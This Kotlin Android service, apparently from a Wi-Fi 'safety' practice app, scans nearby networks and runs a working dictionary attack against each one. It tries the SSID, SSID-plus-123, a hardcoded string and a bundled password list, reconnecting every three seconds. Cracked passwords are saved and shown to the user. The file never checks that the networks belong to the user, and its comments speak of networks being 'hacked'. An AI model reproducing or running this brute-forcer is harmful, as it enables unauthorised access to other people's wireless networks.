package com.practice.securewifi.connect

import android.Manifest
import android.app.*
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.graphics.Color
import android.net.wifi.WifiConfiguration
import android.net.wifi.WifiManager
import android.os.*
import androidx.annotation.RequiresApi
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import com.practice.securewifi.R
import com.practice.securewifi.result_storage.dao.WifiSafetyDao
import com.practice.securewifi.result_storage.database.WifiSafetyDatabase
import com.practice.securewifi.result_storage.entity.WifiCheckResult
import com.practice.securewifi.result_storage.entity.WifiPasswordsCrossRef
import com.practice.securewifi.util.WifiManagerProvider
import kotlinx.coroutines.*

class ConnectionService : Service(), ConnectivityActionReceiver.OnSampleReadyListener {

    private var foundPassword = false

    private var connection: Job = Job()

    private var wifiScanReceiverRegistered = false

    private lateinit var wifiManager: WifiManager

    private lateinit var wifiScanReceiver: BroadcastReceiver

    private lateinit var connectivityActionReceiver: ConnectivityActionReceiver

    private lateinit var dao: WifiSafetyDao

    private lateinit var binder: LocalBinder

    private var updateListener: UpdateListener? = null

    private val coroutineScope = CoroutineScope(Dispatchers.IO)

    inner class LocalBinder : Binder() {
        val service: ConnectionService = this@ConnectionService
    }

    fun addListener(listener: UpdateListener) {
        updateListener = listener
    }

    override fun onCreate() {
        connectivityActionReceiver = ConnectivityActionReceiver(this)
        val intentFilter = IntentFilter()
        intentFilter.addAction(WifiManager.NETWORK_STATE_CHANGED_ACTION)
        registerReceiver(connectivityActionReceiver, intentFilter)

        wifiManager = WifiManagerProvider.getWifiManager(applicationContext)

        dao = WifiSafetyDatabase.getInstance(applicationContext).wifiSafetyDao

        binder = LocalBinder()

        connection.cancel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (!connection.isActive) {
            createNotification()
            wifiManager.isWifiEnabled = true
            updateListener?.onUpdate(Command.ShowMessageToUser(getString(R.string.starting_scan)))
            updateListener?.onUpdate(Command.PrepareForConnections)
            startScanningForNearbyWifi()
        } else {
            unregisterWifiScanReceiverIfRegistered()
            stopConnections()
        }
        return START_NOT_STICKY
    }

    override fun onDestroy() {
        unregisterReceiver(connectivityActionReceiver)
        unregisterWifiScanReceiverIfRegistered()
        super.onDestroy()
    }

    override fun onBind(p0: Intent?): IBinder {
        return binder
    }

    private fun createNotification() {
        val pendingIntent: PendingIntent =
            Intent(this, ConnectFragment::class.java).let { notificationIntent ->
                PendingIntent.getActivity(
                    this, 0, notificationIntent,
                    PendingIntent.FLAG_IMMUTABLE
                )
            }

        val channelId = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            createNotificationChannel("my_service", "My Background Service")
        } else {
            // If earlier version channel ID is not used
            // https://developer.android.com/reference/android/support/v4/app/NotificationCompat.Builder.html#NotificationCompat.Builder(android.content.Context)
            ""
        }

        val notification = NotificationCompat.Builder(
            this,
            channelId
        )
            .setContentTitle(getText(R.string.notification_title))
            .setContentText(getText(R.string.notification_message))
            .setSmallIcon(R.drawable.wifi_password)
            .setContentIntent(pendingIntent)
            .build()

        startForeground(23, notification)
    }

    @RequiresApi(Build.VERSION_CODES.O)
    private fun createNotificationChannel(channelId: String, channelName: String): String {
        val chan = NotificationChannel(
            channelId,
            channelName, NotificationManager.IMPORTANCE_NONE
        )
        chan.lightColor = Color.BLUE
        chan.lockscreenVisibility = Notification.VISIBILITY_PRIVATE
        val service = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        service.createNotificationChannel(chan)
        return channelId
    }

    private fun startScanningForNearbyWifi() {
        wifiScanReceiver = object : BroadcastReceiver() {

            override fun onReceive(context: Context, intent: Intent) {
                val success = intent.getBooleanExtra(
                    WifiManager.EXTRA_RESULTS_UPDATED, false
                )
                if (success) {
                    scanSuccess()
                } else {
                    scanFailure()
                }
                unregisterWifiScanReceiverIfRegistered()
            }
        }

        registerWifiScanReceiver()

        wifiManager.startScan()

        Handler(Looper.getMainLooper()).postDelayed({
            unregisterWifiScanReceiverIfRegistered()
            if (!connection.isActive) {
                stopConnections()
            }
        }, 5000)
    }

    private fun scanSuccess() {
        if (ActivityCompat.checkSelfPermission(
                this,
                Manifest.permission.ACCESS_FINE_LOCATION
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            updateListener?.onUpdate(Command.AskForAccessFineLocationPermission)
            return
        }
        val nearbyWifiPoints = wifiManager.scanResults

        val wifiSSIDs = nearbyWifiPoints.filter {
            it.SSID != "" /*&& WifiManager.calculateSignalLevel(
                it.level,
                10
            ) > 6*/
        }.sortedByDescending { it.level }.map { it.SSID }

        var correctPassword = ""
        var passwordCountNeeded = 0

        connection = coroutineScope.launch {

            withContext(Dispatchers.Main) {
                updateListener?.onUpdate(Command.StartConnections)
            }
            foundPassword = false
            var networkCount = 0
            for (networkSSID in wifiSSIDs) {
                networkCount++
                // If password was found during this search
                if (foundPassword) break

                val wifi = dao.getWifiCheckResult(networkSSID)
                // If this network hasn't ever been a subject to hacking, save it
                if (wifi == null) {
                    dao.insertWifiCheckResult(WifiCheckResult(networkSSID, null))
                } else if (wifi.correctPassword != null) {
                    // If this particular network has already been hacked
                    continue
                }
                val triedPasswords = dao.getTriedPasswordsForWifi(networkSSID)

                val conf = WifiConfiguration()
                conf.SSID = "\"" + networkSSID + "\"" // String should contain ssid in quotes

                val networkPasswords = getPasswordsList(networkSSID)
                var passwordCount = 0

                for (networkPass in networkPasswords) {
                    passwordCount++

                    // If this password has already been checked for this wifi skip it
                    if (triedPasswords.contains(networkPass)) continue

                    withContext(Dispatchers.Main) {
                        updateListener?.onUpdate(
                            Command.ShowMessageToUser(
                                getString(
                                    R.string.attempting_to_connect,
                                    networkSSID,
                                    networkCount, // count of networks already checked
                                    wifiSSIDs.size, // count of networks need to be checked
                                    networkPass, // password currently being tried
                                    passwordCount, // count of passwords already tried
                                    networkPasswords.size, // password count for wifi
                                    60 / (INTERVAL / 1000), // passwords a minute
                                )
                            )
                        )
                    }

                    conf.preSharedKey = "\"" + networkPass + "\""
                    // only works for API < 29
                    val netId = wifiManager.addNetwork(conf)
                    if (netId != -1) {
                        wifiManager.disconnect()
                        wifiManager.enableNetwork(netId, true)
                    } else {
                        val list = wifiManager.configuredNetworks
                        for (network in list) {
                            if (network.SSID != null && network.SSID == "\"" + networkSSID + "\"") {
                                wifiManager.disconnect()
                                wifiManager.enableNetwork(network.networkId, true)
                                wifiManager.reconnect()
                                break
                            }
                        }
                    }
                    delay(INTERVAL)

                    dao.insertWifiPasswordsCrossRef(
                        WifiPasswordsCrossRef(
                            networkSSID,
                            networkPass
                        )
                    )

                    if (foundPassword) {
                        correctPassword = networkPass
                        passwordCountNeeded = passwordCount
                        dao.insertWifiCheckResult(
                            WifiCheckResult(
                                networkSSID,
                                correctPassword
                            )
                        )
                        break
                    }

                }
                if (foundPassword) {
                    withContext(Dispatchers.Main) {
                        updateListener?.onUpdate(
                            Command.ShowMessageToUser(
                                getString(
                                    R.string.password_hacking_results,
                                    networkSSID,
                                    correctPassword,
                                    passwordCountNeeded
                                )
                            )
                        )
                    }
                }
            }
            if (!foundPassword) {
                withContext(Dispatchers.Main) {
                    updateListener?.onUpdate(
                        Command.ShowMessageToUser(
                            getString(R.string.couldnt_find_password)
                        )
                    )
                }
            }
            withContext(Dispatchers.Main) {
                stopConnections()
            }
        }
    }

    private fun scanFailure() {
        updateListener?.onUpdate(Command.ShowMessageToUser(getString(R.string.scan_failure)))
        stopConnections()
    }

    private fun registerWifiScanReceiver() {
        val intentFilter = IntentFilter()
        intentFilter.addAction(WifiManager.SCAN_RESULTS_AVAILABLE_ACTION)
        registerReceiver(wifiScanReceiver, intentFilter)
        wifiScanReceiverRegistered = true
    }

    private fun unregisterWifiScanReceiverIfRegistered() {
        if (wifiScanReceiverRegistered) {
            unregisterReceiver(wifiScanReceiver)
            wifiScanReceiverRegistered = false
        }
    }

    private fun stopConnections() {
        updateListener?.onUpdate(Command.StopConnections)
        connection.cancel()
        stopForegroundService()
    }

    private fun stopForegroundService() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            stopForeground(STOP_FOREGROUND_REMOVE)
        }
        stopSelf()
    }

    private companion object {
        const val INTERVAL = 3000L
    }

    private fun getPasswordsList(ssid: String): List<String> {
        val fixedPasswords = assets.open("passwords.txt").bufferedReader().use {
            it.readLines()
        }
        return listOf(ssid, "pokasuki69", "${ssid}123") + fixedPasswords
    }

    override fun onSampleDataReady() {
        foundPassword = true
    }
}